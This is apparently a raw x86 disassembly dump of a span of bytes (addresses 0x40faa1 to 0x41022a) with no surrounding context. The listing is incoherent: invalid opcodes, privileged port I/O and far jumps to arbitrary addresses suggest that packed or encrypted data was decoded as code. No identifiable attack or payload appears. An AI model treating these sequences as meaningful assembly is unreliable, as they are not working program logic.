  40faa1:	(bad)  
  40faa2:	fld    QWORD PTR [ebx+0x7119bfc3]
  40faa8:	mov    esp,0xf01bea5a
  40faad:	mov    esi,0x7a2bdb6
  40fab2:	fdivr  DWORD PTR [esi-0x7e]
  40fab5:	inc    esi
  40fab6:	aaa    
  40fab7:	push   0xffffffb6
  40fab9:	fwait
  40faba:	mov    ah,0x5a
  40fabc:	in     al,0x83
  40fabe:	mov    esi,0xb973f47
  40fac3:	jae    0x40fb21
  40fac5:	pop    ecx
  40fac6:	pop    ecx
  40fac7:	jl     0x40fa97
  40fac9:	jmp    0x940f66f6
  40face:	mov    edx,0xa79aae84
  40fad3:	mov    ch,0x64
  40fad5:	lock sub BYTE PTR [ebx+0x59aab48c],dl
  40fadc:	mov    cl,0xc9
  40fade:	dec    ebx
  40fadf:	clc    
  40fae0:	out    0xac,al
  40fae2:	add    DWORD PTR [edi-0x31],0x9a667e9f
  40fae9:	test   al,0x35
  40faeb:	dec    esp
  40faec:	xchg   edx,eax
  40faed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faee:	xchg   esp,eax
  40faef:	rcr    BYTE PTR [esi],0xbd
  40faf2:	mul    BYTE PTR [ecx+0x6472a81d]
  40faf8:	sub    dl,BYTE PTR [eax+0x77]
  40fafb:	xor    al,0x77
  40fafd:	ss aad 0xbe
  40fb00:	or     al,0x4b
  40fb02:	and    DWORD PTR ds:0xcea4deb1,ebx
  40fb08:	cs mov edi,0x4a536122
  40fb0e:	repnz rcl DWORD PTR [edx+0x4b],1
  40fb12:	adc    dl,BYTE PTR [ecx]
  40fb14:	call   0x25805b0f
  40fb19:	mov    WORD PTR [edi+eax*1],ss
  40fb1c:	test   BYTE PTR [ecx-0x7422f33a],ah
  40fb22:	or     ch,BYTE PTR [esi]
  40fb24:	ins    DWORD PTR es:[edi],dx
  40fb25:	lds    edi,FWORD PTR [edx+0x7764beb0]
  40fb2b:	(bad)  
  40fb2c:	xchg   edi,eax
  40fb2d:	jg     0x40faf7
  40fb2f:	or     BYTE PTR [ecx],ah
  40fb31:	mov    ecx,0xc5203679
  40fb36:	data16 jl 0x40faf4
  40fb39:	in     al,dx
  40fb3a:	or     esp,edi
  40fb3c:	add    cl,BYTE PTR [ebx+0x20]
  40fb3f:	bound  edi,QWORD PTR ds:0x3805ef00
  40fb45:	push   es
  40fb46:	popf   
  40fb47:	nop
  40fb48:	mov    BYTE PTR [ebp+esi*8+0x56259b83],0xe7
  40fb50:	jbe    0x40faf4
  40fb52:	sahf   
  40fb53:	(bad)
  40fb58:	jmp    0x3cbdd7a9
  40fb5d:	mov    ?,WORD PTR [edi-0x2a]
  40fb60:	mov    cs,WORD PTR [ecx+0x55f174df]
  40fb66:	xor    ebx,DWORD PTR [edi-0x47d6fb9]
  40fb6c:	hlt    
  40fb6d:	rol    DWORD PTR [edi+0x30],1
  40fb70:	push   cs
  40fb71:	aad    0xb6
  40fb73:	pop    ss
  40fb74:	fdiv   QWORD PTR [ebp-0x14]
  40fb77:	xchg   ebp,eax
  40fb78:	out    0x2d,eax
  40fb7a:	fcom   DWORD PTR [edi-0x11]
  40fb7d:	inc    ecx
  40fb7e:	je     0x40fb7b
  40fb80:	mov    al,ds:0xf041782e
  40fb85:	(bad)
  40fb88:	xchg   edi,eax
  40fb89:	and    eax,eax
  40fb8b:	or     DWORD PTR [edx-0x22],ebp
  40fb8e:	xor    al,0x72
  40fb90:	xor    DWORD PTR [eax],0xffffff9f
  40fb93:	sbb    al,0x44
  40fb95:	(bad)  
  40fb96:	push   esi
  40fb97:	cli    
  40fb98:	sub    dh,BYTE PTR [esi+0x4c]
  40fb9b:	mov    ecx,0xdf99a726
  40fba0:	es jns 0x40fb83
  40fba3:	sti    
  40fba4:	popf   
  40fba5:	mov    dh,0x1d
  40fba7:	fstp   TBYTE PTR [ebp+0x5550fe48]
  40fbad:	xchg   ecx,eax
  40fbae:	jb     0x40fc2a
  40fbb0:	mov    esi,0x75facbe5
  40fbb5:	jae    0x40fbbb
  40fbb7:	or     BYTE PTR [eax-0x7a],bl
  40fbba:	sub    dl,BYTE PTR [ecx]
  40fbbc:	test   al,0x95
  40fbbe:	xor    dh,cl
  40fbc0:	in     al,dx
  40fbc1:	rol    DWORD PTR [eax+eiz*2-0x35],cl
  40fbc5:	(bad)  
  40fbc6:	cmp    al,0xa7
  40fbc8:	jno    0x40fb60
  40fbca:	imul   esp,DWORD PTR [ebp-0x4681ff6b],0x51
  40fbd1:	xchg   ebx,eax
  40fbd2:	sub    BYTE PTR [ecx+eax*1-0x4d97dd45],dh
  40fbd9:	loop   0x40fb72
  40fbdb:	mov    ebp,0x3e94a2b4
  40fbe0:	(bad)  
  40fbe1:	jo     0x40fb66
  40fbe3:	mov    ds:0x8794cdf3,al
  40fbe8:	out    0xc1,eax
  40fbea:	mov    esp,0x8aa450d5
  40fbef:	scas   eax,DWORD PTR es:[edi]
  40fbf0:	xchg   esi,eax
  40fbf1:	add    DWORD PTR [esi-0x7a049546],0xf5b0bba4
  40fbfb:	idiv   esi
  40fbfd:	fsub   QWORD PTR [ebx]
  40fbff:	popf   
  40fc00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc01:	mov    esp,0xfc9fec67
  40fc06:	pop    esp
  40fc07:	jle    0x40fc72
  40fc09:	fcomp  QWORD PTR [edi+0x21]
  40fc0c:	shl    DWORD PTR [ebp+0xb],1
  40fc0f:	pop    DWORD PTR [esi+0x267716a6]
  40fc15:	jo     0x40fc5e
  40fc17:	mov    dh,0x9
  40fc19:	int3   
  40fc1a:	sub    ch,bl
  40fc1c:	pop    ss
  40fc1d:	mov    eax,0xb799df8
  40fc22:	push   edx
  40fc23:	add    eax,0x9a1f4339
  40fc28:	outs   dx,BYTE PTR ds:[esi]
  40fc29:	and    ebx,ecx
  40fc2b:	inc    edi
  40fc2c:	jge    0x40fc63
  40fc2e:	sbb    DWORD PTR [ebx+0x77],esi
  40fc31:	dec    esi
  40fc32:	or     eax,0xd0ded420
  40fc37:	(bad)  
  40fc39:	cmp    dh,al
  40fc3b:	push   0xffffffd1
  40fc3d:	xor    ah,BYTE PTR [edi+0x784fde8a]
  40fc43:	retf   
  40fc44:	out    dx,al
  40fc45:	jp     0x40fc46
  40fc47:	dec    ebx
  40fc48:	loope  0x40fc49
  40fc4a:	call   0x8e7c:0x3667d780
  40fc51:	dec    esi
  40fc52:	push   esi
  40fc53:	test   al,0x57
  40fc55:	sti    
  40fc56:	call   0xf48e:0xe436b6d8
  40fc5d:	jg     0x40fcbf
  40fc5f:	pop    ecx
  40fc60:	call   0x3a57:0xf8488696
  40fc67:	adc    eax,0xfa5c1a64
  40fc6c:	mov    DWORD PTR ds:0x7bbd6e68,esp
  40fc72:	sub    esi,edx
  40fc74:	jns    0x40fc03
  40fc76:	mov    ds:0xd08c590a,eax
  40fc7b:	xchg   edi,eax
  40fc7c:	xchg   edi,eax
  40fc7d:	es jle 0x40fc81
  40fc80:	dec    esi
  40fc81:	ret    
  40fc82:	js     0x40fc1f
  40fc84:	test   BYTE PTR [ecx],0x4c
  40fc87:	inc    eax
  40fc88:	ficom  WORD PTR ds:0x161c3741
  40fc8e:	push   edx
  40fc8f:	aaa    
  40fc90:	jns    0x40fc50
  40fc92:	inc    esp
  40fc93:	pop    es
  40fc94:	mov    ebx,0xb77c7e91
  40fc99:	sbb    eax,0xfdb0467f
  40fc9e:	xchg   esp,eax
  40fc9f:	xlat   BYTE PTR ds:[ebx]
  40fca0:	or     BYTE PTR [eax-0x64],dl
  40fca3:	xor    eax,0xfd28ffc6
  40fca8:	xchg   esi,eax
  40fca9:	pop    esp
  40fcaa:	adc    dl,bl
  40fcac:	jge    0x40fcf0
  40fcae:	add    ah,BYTE PTR [ebp+0x1f7cf687]
  40fcb4:	xor    al,0x66
  40fcb6:	sub    al,0x39
  40fcb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb9:	mov    ebx,0x54f067d8
  40fcbe:	fdiv   DWORD PTR [ecx]
  40fcc0:	fs iret 
  40fcc2:	scas   eax,DWORD PTR es:[edi]
  40fcc3:	hlt    
  40fcc4:	or     al,0x5c
  40fcc6:	adc    DWORD PTR [ebx],esp
  40fcc8:	cmp    dl,cl
  40fcca:	inc    esi
  40fccb:	pop    ss
  40fccc:	ret    0x3386
  40fccf:	xchg   esp,eax
  40fcd0:	addr16 jp 0x40fc72
  40fcd3:	xor    BYTE PTR [edx+0xb15eacb],bh
  40fcd9:	pop    ebx
  40fcda:	jge    0x40fc6b
  40fcdc:	mov    ?,WORD PTR [ecx-0x6fc70ad7]
  40fce2:	or     esi,DWORD PTR [esp+ebp*8+0x30ee520a]
  40fce9:	fs dec edi
  40fceb:	mov    dh,0xb9
  40fced:	xchg   esp,eax
  40fcee:	leave  
  40fcef:	push   ebx
  40fcf0:	sahf   
  40fcf1:	mov    edi,0x73e9b1d9
  40fcf6:	xor    BYTE PTR [edi+ebx*2],bl
  40fcf9:	push   es
  40fcfa:	scas   eax,DWORD PTR es:[edi]
  40fcfb:	(bad)  [ebp+0x1ec1b80a]
  40fd01:	dec    BYTE PTR [esi+0x3d]
  40fd04:	pop    edx
  40fd05:	out    dx,al
  40fd06:	xor    DWORD PTR ds:0x7f5978d8,ecx
  40fd0c:	test   ch,0x2b
  40fd0f:	sahf   
  40fd10:	es inc esi
  40fd12:	shr    BYTE PTR [eax-0x7d],cl
  40fd15:	sbb    DWORD PTR [ebx+eiz*4+0x308abc6a],ebx
  40fd1c:	mov    bl,0x32
  40fd1e:	fild   WORD PTR [esi-0x276db960]
  40fd24:	xchg   ebx,eax
  40fd25:	pusha  
  40fd26:	je     0x40fcdb
  40fd28:	mov    ds:0xa6c44250,eax
  40fd2d:	mov    ebx,0x9e7b203b
  40fd32:	cli    
  40fd33:	test   eax,0x498cfdd7
  40fd38:	out    0x20,al
  40fd3a:	adc    BYTE PTR [ecx+0x152c6f5d],ch
  40fd40:	(bad)  
  40fd41:	mov    al,0x39
  40fd43:	neg    BYTE PTR [ecx-0x57839284]
  40fd49:	push   ds
  40fd4a:	gs xchg esp,eax
  40fd4c:	add    edi,ebx
  40fd4e:	cli    
  40fd4f:	inc    edx
  40fd50:	inc    ecx
  40fd52:	inc    ecx
  40fd53:	lods   al,BYTE PTR ds:[esi]
  40fd54:	leave  
  40fd55:	mov    bl,0x78
  40fd57:	mov    ds:0x223e2d43,al
  40fd5c:	push   edi
  40fd5d:	add    eax,0x3ffd1f14
  40fd62:	dec    ebx
  40fd63:	dec    ebx
  40fd64:	enter  0x5656,0x2e
  40fd68:	adc    al,0xd8
  40fd6b:	adc    ch,BYTE PTR [ebp+0x1368b543]
  40fd71:	pop    ss
  40fd72:	xchg   BYTE PTR [edi],cl
  40fd74:	std    
  40fd75:	xchg   DWORD PTR [eax-0x61],ebp
  40fd78:	sbb    al,0x47
  40fd7a:	mov    bl,0x3a
  40fd7c:	sbb    bl,BYTE PTR [esi+0x48fc66c5]
  40fd82:	sahf   
  40fd83:	adc    DWORD PTR [ebx+0x7fba6648],ebx
  40fd89:	add    eax,0x2220fde9
  40fd8e:	les    esi,FWORD PTR [ebx-0x36]
  40fd91:	xchg   edx,eax
  40fd92:	jmp    0x40fd72
  40fd94:	shr    eax,cl
  40fd96:	fldenv [ecx+esi*4+0x75]
  40fd9a:	xor    ebp,eax
  40fd9c:	dec    eax
  40fd9d:	es gs leave 
  40fda0:	cmp    ah,BYTE PTR [edx+0x7de65bde]
  40fda6:	stos   DWORD PTR es:[edi],eax
  40fda7:	fs js  0x40fd7f
  40fdaa:	je     0x40fda6
  40fdac:	call   0xa4562200
  40fdb1:	aaa    
  40fdb2:	cmp    edx,edi
  40fdb4:	pop    ebx
  40fdb5:	pop    ecx
  40fdb6:	mov    bh,0xe9
  40fdb8:	sub    dl,BYTE PTR [edi-0x7f9353bb]
  40fdbe:	out    0x6f,al
  40fdc0:	push   ebp
  40fdc1:	or     esi,ebx
  40fdc3:	and    eax,0xf8fd740b
  40fdc8:	test   BYTE PTR [ebx],al
  40fdca:	loope  0x40fe07
  40fdcc:	das    
  40fdcd:	pop    ecx
  40fdce:	nop
  40fdcf:	test   al,0xfc
  40fdd1:	in     al,0xf2
  40fdd3:	jb     0x40fe00
  40fdd5:	mov    edx,0x5afc86a6
  40fdda:	mov    esi,eax
  40fddc:	aaa    
  40fddd:	cli    
  40fdde:	cmp    al,0xf3
  40fde0:	leave  
  40fde1:	xchg   DWORD PTR ds:0xbc07acbf,ecx
  40fde7:	mov    cl,0xa5
  40fde9:	dec    esp
  40fdea:	popf   
  40fdeb:	ins    DWORD PTR es:[edi],dx
  40fdec:	push   ecx
  40fded:	push   es
  40fdee:	pop    ebx
  40fdef:	dec    eax
  40fdf0:	and    ch,BYTE PTR [edx-0xe]
  40fdf3:	pop    es
  40fdf4:	in     eax,0xae
  40fdf6:	jmp    0xdee45056
  40fdfb:	aam    0x30
  40fdfd:	je     0x40fde0
  40fdff:	push   edi
  40fe00:	and    al,bh
  40fe02:	cmp    DWORD PTR [edi+0x5c],0xffffff84
  40fe06:	pop    esp
  40fe07:	icebp  
  40fe08:	nop
  40fe09:	call   0x722f2478
  40fe0e:	outs   dx,BYTE PTR es:[esi]
  40fe10:	sbb    al,0xc7
  40fe12:	xchg   ebx,eax
  40fe13:	test   al,0x46
  40fe15:	inc    esi
  40fe16:	pop    eax
  40fe17:	scas   al,BYTE PTR es:[edi]
  40fe18:	pop    ecx
  40fe19:	imul   eax,DWORD PTR [esi-0x21],0xb
  40fe1d:	mov    DWORD PTR [ecx+0x59],ebp
  40fe20:	push   esp
  40fe21:	jp     0x40fdad
  40fe23:	and    al,0x0
  40fe25:	je     0x40fe6d
  40fe27:	xlat   BYTE PTR ds:[ebx]
  40fe28:	rol    esi,0x2c
  40fe2b:	sahf   
  40fe2c:	dec    edi
  40fe2d:	hlt    
  40fe2e:	sub    ecx,DWORD PTR [esi+eax*1]
  40fe31:	pop    edi
  40fe32:	ftst   
  40fe34:	jle    0x40fe6a
  40fe36:	add    DWORD PTR [esi-0x2764bfab],ebx
  40fe3c:	lds    edi,FWORD PTR [esi+esi*1+0x38]
  40fe40:	popf   
  40fe41:	in     al,dx
  40fe42:	xchg   ebp,eax
  40fe43:	lods   eax,DWORD PTR ds:[esi]
  40fe44:	out    dx,al
  40fe45:	popf   
  40fe46:	in     al,0xee
  40fe48:	fs stos DWORD PTR es:[edi],eax
  40fe4a:	pop    eax
  40fe4b:	pop    ss
  40fe4c:	xchg   esi,eax
  40fe4d:	icebp  
  40fe4e:	lods   al,BYTE PTR ds:[esi]
  40fe4f:	xor    al,0x60
  40fe51:	mov    WORD PTR [ebp-0xf14cc20],ss
  40fe57:	push   ss
  40fe58:	push   edx
  40fe59:	mov    ebp,0x45c9e6f2
  40fe5e:	test   DWORD PTR [eax-0x16],0xd4f1dbf3
  40fe65:	push   ebp
  40fe66:	and    eax,0x6dab1a3e
  40fe6b:	push   cs
  40fe6c:	sbb    edx,esi
  40fe6e:	push   es
  40fe6f:	and    cl,ah
  40fe71:	in     al,0x7
  40fe73:	jl     0x40fe7a
  40fe75:	mov    ds,WORD PTR [ebx-0x374934e1]
  40fe7b:	lods   al,BYTE PTR ds:[esi]
  40fe7c:	jo     0x40fe6c
  40fe7e:	pop    ss
  40fe7f:	push   0x6b
  40fe81:	or     DWORD PTR [edx-0x1e3fcb7],edx
  40fe87:	and    BYTE PTR [edi-0x57ac6c26],ah
  40fe8d:	mov    al,0xa1
  40fe8f:	arpl   bx,dx
  40fe91:	xchg   ebx,eax
  40fe92:	rcr    DWORD PTR [edi-0x22],cl
  40fe95:	mov    esp,DWORD PTR [ebx+eax*1+0x7f54f216]
  40fe9c:	push   eax
  40fe9d:	stos   DWORD PTR es:[edi],eax
  40fe9e:	inc    ebx
  40fe9f:	bound  edx,QWORD PTR ss:[eax]
  40fea2:	ds loope 0x40fe99
  40fea5:	fsubr  QWORD PTR [edi+0x5c]
  40fea8:	outs   dx,DWORD PTR ds:[esi]
  40fea9:	fstp   DWORD PTR [ebx+ebx*4]
  40feac:	in     al,dx
  40fead:	rol    BYTE PTR [eax+0x5e],1
  40feb0:	or     cl,dl
  40feb2:	inc    eax
  40feb3:	dec    ecx
  40feb4:	jecxz  0x40fe52
  40feb6:	jo     0x40fe3b
  40feb8:	pushf  
  40feb9:	add    al,0x88
  40febb:	mov    dh,0x6
  40febd:	xor    ecx,DWORD PTR [edi]
  40febf:	in     eax,0xc0
  40fec1:	inc    esi
  40fec2:	dec    esp
  40fec3:	fisubr WORD PTR [edi+0x3e9065cd]
  40fec9:	push   edi
  40feca:	pushf  
  40fecb:	push   ds
  40fecc:	scas   al,BYTE PTR es:[edi]
  40fecd:	mov    ah,0xa3
  40fecf:	in     eax,dx
  40fed0:	ja     0x40febd
  40fed2:	push   cs
  40fed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed4:	inc    BYTE PTR [eax+0x60]
  40fed7:	or     BYTE PTR ds:0xd20b6f7c,bl
  40fedd:	repz dec esi
  40fedf:	xor    BYTE PTR [esi],al
  40fee1:	cmp    dh,BYTE PTR [ecx+ebx*4]
  40fee4:	sbb    BYTE PTR [edi-0xd334fea],al
  40feea:	aad    0x9
  40feec:	stc    
  40feed:	test   al,0xc1
  40feef:	jmp    0x1453:0xfd812ff5
  40fef6:	xlat   BYTE PTR ds:[ebx]
  40fef7:	jb     0x40ff37
  40fef9:	enter  0x1703,0x4d
  40fefd:	add    BYTE PTR [esi-0x902f8f7],dl
  40ff03:	sub    edi,ebp
  40ff05:	js     0x40ff4d
  40ff07:	sbb    dh,BYTE PTR [esi-0x1a]
  40ff0a:	or     ch,dh
  40ff0c:	xchg   ebx,eax
  40ff0d:	mov    edi,0x613d253e
  40ff12:	push   ebp
  40ff13:	stos   DWORD PTR es:[edi],eax
  40ff14:	sub    DWORD PTR [edx+ebp*4-0x29],edx
  40ff18:	mov    ds:0x7d984a02,eax
  40ff1d:	pop    ecx
  40ff1e:	jg     0x40ff09
  40ff20:	retf   
  40ff21:	je     0x40ff09
  40ff23:	or     al,0x5a
  40ff25:	jp     0x40ff7b
  40ff27:	push   edx
  40ff28:	jmp    esi
  40ff2a:	push   es
  40ff2b:	sub    edx,DWORD PTR [ebx]
  40ff2d:	std    
  40ff2e:	out    0xe4,eax
  40ff30:	lds    ebp,FWORD PTR [edi-0x58]
  40ff33:	ins    DWORD PTR es:[edi],dx
  40ff34:	sbb    DWORD PTR [ebp+ebp*1-0x14],eax
  40ff38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff3a:	ss cmc 
  40ff3c:	jae    0x40ff0f
  40ff3e:	push   ds
  40ff3f:	mov    WORD PTR ds:0xd627006e,ds
  40ff45:	adc    cl,ch
  40ff47:	dec    esp
  40ff48:	sti    
  40ff49:	mov    ebx,0xb6af610
  40ff4e:	sti    
  40ff4f:	push   eax
  40ff50:	dec    ebx
  40ff51:	lds    ebx,FWORD PTR [esi]
  40ff53:	mov    ebx,0xab3dc1c0
  40ff58:	mov    bl,0xe4
  40ff5a:	sub    BYTE PTR cs:[ebp-0x148d222b],dh
  40ff61:	ret    
  40ff62:	fimul  WORD PTR [edx-0x13]
  40ff65:	dec    ebp
  40ff66:	dec    esp
  40ff67:	adc    eax,0x1077dc64
  40ff6c:	dec    esp
  40ff6d:	fbld   TBYTE PTR [eax+0x25263342]
  40ff73:	mov    edi,0x5d94fa87
  40ff78:	(bad)  es:[ebx+0x542221ae]
  40ff7f:	adc    eax,DWORD PTR [ebx-0x3c]
  40ff82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff83:	xchg   esp,eax
  40ff84:	or     eax,0xd2e4652e
  40ff89:	xor    ecx,DWORD PTR [ecx-0x50]
  40ff8c:	ins    DWORD PTR es:[edi],dx
  40ff8d:	mov    eax,ds:0x17e103b2
  40ff92:	jg     0x40ffab
  40ff94:	mov    al,0x8e
  40ff96:	inc    eax
  40ff97:	stos   DWORD PTR es:[edi],eax
  40ff98:	push   ebp
  40ff99:	sti    
  40ff9a:	push   ebp
  40ff9b:	pop    ebp
  40ff9c:	pusha  
  40ff9d:	mov    eax,ds:0xa559ca9e
  40ffa2:	loop   0x40ffc5
  40ffa4:	cmc    
  40ffa5:	in     eax,0x3a
  40ffa7:	add    eax,0xdc73fd1b
  40ffac:	xor    eax,0x6696476e
  40ffb1:	push   esi
  40ffb2:	jg     0x40ffbc
  40ffb4:	push   ebp
  40ffb5:	mov    DWORD PTR [eax-0x16fd4413],ebp
  40ffbb:	or     eax,0x31dcf530
  40ffc0:	outs   dx,BYTE PTR ds:[esi]
  40ffc1:	ret    
  40ffc2:	dec    ebp
  40ffc3:	and    esp,ecx
  40ffc5:	std    
  40ffc6:	and    al,0xa7
  40ffc8:	mov    ebp,0x24b719fc
  40ffcd:	jmp    0x40ff8a
  40ffcf:	(bad)  
  40ffd0:	(bad)  
  40ffd1:	jo     0x40ffe9
  40ffd3:	push   edi
  40ffd4:	aaa    
  40ffd5:	mov    BYTE PTR [edi-0x19a5ac95],al
  40ffdb:	jno    0x40ff95
  40ffdd:	pop    esp
  40ffde:	cli    
  40ffdf:	xchg   esi,eax
  40ffe0:	mov    al,ds:0x6137d8fd
  40ffe5:	inc    sp
  40ffe7:	dec    ebp
  40ffe8:	sbb    BYTE PTR [edx+edi*1],bh
  40ffeb:	mov    al,ds:0x65631fc0
  40fff0:	inc    ebx
  40fff1:	into   
  40fff2:	gs and ebx,ecx
  40fff5:	push   0xa8924891
  40fffa:	scas   eax,DWORD PTR es:[edi]
  40fffb:	(bad)  
  40fffc:	ret    
  40fffd:	xchg   esp,eax
  40fffe:	das    
  40ffff:	xchg   DWORD PTR [edx+edi*8+0x12de7444],ebp
  410006:	je     0x410026
  410008:	fwait
  410009:	out    dx,eax
  41000a:	mov    dh,0xe9
  41000c:	sub    DWORD PTR [ecx+ecx*4+0x195e75b5],ecx
  410013:	(bad)  
  410014:	dec    ecx
  410015:	fwait
  410016:	cs xchg esi,eax
  410018:	rcr    BYTE PTR [esi],cl
  41001a:	jp     0x41003f
  41001c:	xchg   ecx,eax
  41001d:	nop
  41001e:	rol    BYTE PTR [eax-0x5d],0x85
  410022:	push   0x7c8d0e8
  410027:	mov    eax,ds:0xf9b3fc63
  41002c:	out    dx,al
  41002d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002e:	shl    dl,0xfc
  410031:	(bad)  
  410032:	jmp    0xac1f:0xb8f71b8c
  410039:	mov    dh,0xde
  41003b:	and    al,0xa3
  41003d:	jl     0x4100b7
  41003f:	mov    WORD PTR [eax-0x7b],cs
  410042:	out    0xea,eax
  410044:	in     eax,dx
  410045:	or     al,0x27
  410047:	repnz pop es
  410049:	xor    BYTE PTR [ecx+0x3a23a5c1],cl
  41004f:	fmul   st,st(4)
  410051:	(bad)  
  410052:	lock or al,0x38
  410055:	loopne 0x40fff8
  410057:	dec    esi
  410058:	arpl   WORD PTR [eax+esi*8+0x23b589c5],ax
  41005f:	cld    
  410060:	pop    ebp
  410061:	sub    DWORD PTR [edx],esi
  410063:	iret   
  410064:	and    ebp,edx
  410066:	(bad)  
  410067:	or     BYTE PTR [esi+eiz*4-0x47847c24],ah
  41006e:	dec    ebp
  41006f:	dec    edi
  410070:	or     DWORD PTR [ecx+ebp*4+0x3d],ecx
  410074:	stc    
  410075:	std    
  410076:	stos   DWORD PTR es:[edi],eax
  410077:	mov    al,0x66
  410079:	mul    DWORD PTR [ebx+edx*4-0x4e6c3a4f]
  410080:	aam    0xf3
  410082:	loope  0x410014
  410084:	jae    0x4100fb
  410086:	push   ebp
  410087:	xchg   ebx,eax
  410088:	retf   
  410089:	xchg   esp,eax
  41008a:	cmp    BYTE PTR [esi-0x7872a49b],ah
  410090:	jns    0x4100b9
  410092:	add    BYTE PTR [edi],bl
  410094:	adc    ah,BYTE PTR [ecx]
  410096:	mov    bl,0xd1
  410098:	call   0x8826ff
  41009d:	ret    0x2927
  4100a0:	sub    al,0xce
  4100a2:	popa   
  4100a3:	(bad)  
  4100a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100a6:	aad    0xe
  4100a8:	loope  0x4100e5
  4100aa:	arpl   WORD PTR [ebx-0x4c],di
  4100ad:	mov    cl,0xbb
  4100af:	popf   
  4100b0:	icebp  
  4100b1:	xchg   esp,eax
  4100b2:	adc    ebx,DWORD PTR [ebx+0x1257474b]
  4100b8:	cs out 0xa0,eax
  4100bb:	data16 or ax,0x9115
  4100c0:	sbb    eax,0xcac2f9c8
  4100c5:	clc    
  4100c6:	fisub  DWORD PTR [ecx]
  4100c8:	imul   eax,DWORD PTR [ebp+0x3d],0x4b
  4100cc:	push   es
  4100cd:	out    0xd1,al
  4100cf:	mov    eax,DWORD PTR [edx+0x5c1a7a7f]
  4100d5:	push   ebp
  4100d6:	loope  0x41005c
  4100d8:	mov    ds:0xee95d2a1,eax
  4100dd:	(bad)  
  4100df:	fisttp DWORD PTR [edi]
  4100e1:	inc    ecx
  4100e2:	sub    edx,DWORD PTR [eax-0x42]
  4100e5:	and    BYTE PTR [ebx+0x37],ah
  4100e8:	xor    DWORD PTR [esi+0x4fec3778],0xe6001421
  4100f2:	jp     0x410125
  4100f4:	mov    edi,0x7b1278eb
  4100f9:	ret    
  4100fa:	xlat   BYTE PTR ds:[ebx]
  4100fb:	jb     0x4100f6
  4100fd:	in     eax,dx
  4100fe:	sub    al,0x95
  410100:	push   ebx
  410101:	sub    BYTE PTR [ecx],bh
  410103:	arpl   WORD PTR [edx],cx
  410105:	nop
  410106:	nop
  410107:	jg     0x410091
  410109:	shrd   DWORD PTR ds:0xe5695d18,ebx,0xe
  410111:	jp     0x410140
  410113:	push   edi
  410114:	cmc    
  410115:	mov    ebx,DWORD PTR [edx+edi*8-0x2b]
  410119:	add    BYTE PTR [eax-0x537d68ae],cl
  41011f:	mov    cl,0x88
  410121:	sub    cl,BYTE PTR [esi+0x37]
  410124:	add    ecx,0xffffffab
  410127:	mov    al,0x84
  410129:	inc    edx
  41012a:	clc    
  41012b:	mov    ecx,0x6db40c84
  410130:	mov    DWORD PTR [ecx+0x57],edi
  410133:	les    edi,FWORD PTR [ebx+eiz*1]
  410136:	xchg   edx,eax
  410137:	push   ss
  410138:	lods   al,BYTE PTR ds:[esi]
  410139:	daa    
  41013a:	lea    ebp,ds:[ebx]
  41013d:	inc    edx
  41013e:	mov    ebp,0xe615e090
  410143:	xor    ebx,DWORD PTR [ecx]
  410145:	cmp    DWORD PTR [eax-0x28],ebx
  410148:	clc    
  410149:	xchg   ebx,eax
  41014a:	lods   al,BYTE PTR ds:[esi]
  41014b:	call   0x99a6:0x87e0f845
  410152:	hlt    
  410153:	xor    DWORD PTR [edi],eax
  410155:	lods   eax,DWORD PTR ds:[esi]
  410156:	in     eax,0x30
  410158:	dec    eax
  410159:	jge    0x41016a
  41015b:	cmc    
  41015c:	scas   eax,DWORD PTR es:[edi]
  41015d:	mov    ebp,0xde2689b3
  410162:	fstp   DWORD PTR [ecx+0x2ad362a]
  410168:	mov    dl,BYTE PTR [esi]
  41016a:	and    bl,bh
  41016c:	dec    DWORD PTR [ebx-0x47c0fe49]
  410172:	adc    eax,0xffffffa1
  410175:	dec    esp
  410176:	inc    eax
  410177:	or     al,0x25
  410179:	fsub   st(0),st
  41017b:	and    DWORD PTR [eax+0x27],0x92c6fa5c
  410182:	mov    eax,DWORD PTR [ebp-0x44b1e098]
  410188:	and    edx,DWORD PTR [ebx+0x5332050c]
  41018e:	aad    0x8d
  410190:	xchg   ebx,eax
  410191:	mov    dl,0xb6
  410193:	dec    edi
  410194:	push   cs
  410195:	hlt    
  410196:	test   al,0x85
  410198:	daa    
  410199:	and    DWORD PTR [esi+eiz*8],ebp
  41019c:	lods   al,BYTE PTR ds:[esi]
  41019d:	std    
  41019e:	adc    DWORD PTR ds:0x5f7722fc,0xba8ceaaa
  4101a8:	cmp    dh,BYTE PTR [edx]
  4101aa:	cmc    
  4101ab:	sub    BYTE PTR cs:0xf5dcbcda,al
  4101b2:	jmp    0x4596:0x4d2cabf7
  4101b9:	push   edx
  4101ba:	popa   
  4101bb:	stc    
  4101bc:	xor    ah,bl
  4101be:	(bad)  [edi+0x6a8191e6]
  4101c4:	add    eax,0x894e75cc
  4101c9:	repnz test ebx,edx
  4101cc:	or     edx,DWORD PTR gs:[eax+0x542c84fa]
  4101d3:	cmp    BYTE PTR fs:[edi-0x54acbc0a],0x70
  4101db:	aad    0x36
  4101dd:	vphaddubd ymm6,XMMWORD PTR [edi+ecx*4-0x58]
  4101e4:	ss mov ecx,0x60a03aa5
  4101ea:	sub    dl,BYTE PTR [eax-0x58bdc1f9]
  4101f0:	jle    0x410180
  4101f2:	into   
  4101f3:	jo     0x410203
  4101f5:	(bad)  
  4101f6:	mov    eax,0x946ddf7b
  4101fb:	jl     0x4101c4
  4101fd:	call   0xc993:0x881d4944
  410204:	fsubr  DWORD PTR [ebp-0x2c]
  410207:	into   
  410208:	sbb    ecx,DWORD PTR [ebp+0x218b21b4]
  41020e:	mov    eax,ds:0x1bb906e0
  410213:	inc    esi
  410214:	dec    esi
  410215:	rcl    al,0xd6
  410218:	xchg   ebp,eax
  410219:	ins    DWORD PTR es:[edi],dx
  41021a:	jmp    0x4101a0
  41021c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41021d:	test   eax,0xfc5685e0
  410222:	push   ss
  410223:	movaps XMMWORD PTR [esi+0x1bc079df],xmm5
  41022a:	imul   eax,DWORD PTR [ecx-0x4e],0x834a035c
